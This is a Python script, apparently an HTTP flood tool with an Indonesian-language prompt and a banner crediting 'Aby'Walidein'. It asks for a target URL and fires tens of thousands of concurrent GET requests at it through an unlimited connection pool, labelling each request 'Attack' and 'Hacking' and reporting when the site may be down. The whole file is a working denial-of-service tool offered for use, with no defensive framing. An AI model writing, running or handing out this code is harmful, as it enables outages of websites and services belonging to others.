#!/usr/bin/python3
# -*- coding: utf-8 -*-
import asyncio
import aiohttp
import fade
import os
# Clear command prompt based on the operating system
if os.name == "nt":  # Windows
    os.system("cls")
else:  # Unix/Linux/Mac
    os.system("clear")

logo = """
         _/       _/     _/ _/      _/ _/ _/           _/ _/ _/
        _/       _/  _/       _/  _/       _/                 _/
       _/       _/  _/       _/  _/       _/                  _/
      _/ _/ _/ _/  _/       _/  _/       _/  _/ _/    _/ _/ _/
     _/       _/  _/ _/ _/ _/  _/   _/  _/                   _/
    _/       _/  _/       _/   _/ _/ _/                      _/
                                  _/                 _/ _/ _/                                                                                 
╔═════════════════════════════════════════════════════════════════╗
║\033[33m                ~ H U D A I R U L  A L - A Q S H A ~             \033[31m║
║\033[32m                    I N T E R N A L  S C R I P T                 \033[31m║
║\033[96m                           By: Aby'Walidein                      \033[31m║
║\033[37m                               ——o0o——                           \033[31m║
╚═════════════════════════════════════════════════════════════════╝
"""
faded_text = fade.fire(logo)
print(faded_text)
ask = fade.pinkred("\033[33m==⟩⟩ RUN SC BUTUH WKT 35 DETIK DG TARGET URL: \033[0m")
url = input(ask)
print("\033[96mMOHON BERSABAR KARENA INI BUKAN UJIAN..! 🤭\033[0m")

async def increment_view_count(session):
    try:
        async with session.get(url) as response:
            if response.status == 200:
                print("\033[95m[💥] \033[96mHUDAIRUL-AQSHA \033[97m Attack \033[33m" +str(url)+ "  \033[31mHacking\033[0m")
            else:
                print("\033[33m[*] \033[33mHUDAIRUL-AQSHA \033[36m Attack  \033[35m" +str(url)+ "  \033[93mHacking\033[0m")
    except aiohttp.ClientError as e:
            print("\033[31m[!] \033[32mHUDAIRUL-AQSHA \033[31m Attack  \033[33m" +str(url)+ "  \033[37mMaybe down!\033[0m")

async def main():
    connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(19999):  # Increase the number of concurrent requests
            task = asyncio.create_task(increment_view_count(session))
            tasks.append(task)
            for i in range(19999):  # Increase the number of concurrent requests
                task = asyncio.create_task(increment_view_count(session))
                tasks.append(task)
            await asyncio.gather(*tasks)
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
